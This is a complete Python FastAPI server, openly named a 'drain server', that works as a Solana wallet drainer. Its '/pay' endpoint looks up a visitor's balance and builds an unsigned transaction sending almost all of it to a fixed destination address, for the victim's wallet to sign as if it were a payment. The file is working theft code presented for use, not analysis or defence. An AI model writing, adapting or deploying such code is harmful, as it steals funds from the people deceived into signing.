# drain_server.py  —  pip install fastapi uvicorn httpx solders
import os
from fastapi import FastAPI, HTTPException, Response
import httpx
from solders.pubkey import Pubkey
from solders.system_program import TransferParams, transfer
from solders.transaction import Transaction
from solders.message import Message

DEST = Pubkey.from_string("AfmpM8nAeh6UEYDkoM9eiQ8wBBfoWYzghRSxLwnyPjpE")
RPC = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
FEE = 5_000
RENT = 890_880  # keeps the wallet alive so it doesn't error before signing
app = FastAPI()

@app.get("/pay")
async def drain(from_: str) -> Response:
    async with httpx.AsyncClient(timeout=10) as c:
        r = await c.post(RPC, json={"jsonrpc": "2.0", "id": 1,
            "method": "getBalance", "params": [from_]})
    bal = r.json()["result"]["value"]
    amt = bal - RENT - FEE
    if amt <= 0:
        raise HTTPException(400, "nothing to drain")
    ixs = [transfer(TransferParams(from_pubkey=Pubkey.from_string(from_), to_pubkey=DEST, lamports=amt))]
    msg = Message.new_blockhash(ixs, Pubkey.from_string(from_))
    tx = Transaction.new_unsigned(msg)  # wallet signs, wallet sends
    return Response(content=b'{"transaction":"' + __import__("base64").b64encode(bytes(tx)) + b'"}',
                    media_type="application/json")